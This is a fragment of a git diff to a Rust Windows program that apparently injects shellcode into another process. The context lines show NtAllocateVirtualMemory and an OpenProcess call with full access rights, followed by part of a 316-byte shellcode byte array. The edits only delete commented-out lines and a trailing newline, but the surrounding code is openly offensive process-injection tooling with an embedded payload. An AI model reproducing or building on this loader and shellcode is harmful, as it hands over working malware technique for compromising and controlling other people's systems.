@@ -122,8 +122,6 @@ pub fn main() -> windows::core::Result<()> {
             "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
             openprocess_status.0
         );
-        // let h_process = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)?;
-        // assert!(h_process.0 != 0, "OpenProcess failed");
 
         let shellcode: [u8; 316] = [
             0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41,
@@ -213,4 +211,3 @@ pub fn main() -> windows::core::Result<()> {
         return Ok(());
     }
 }
-
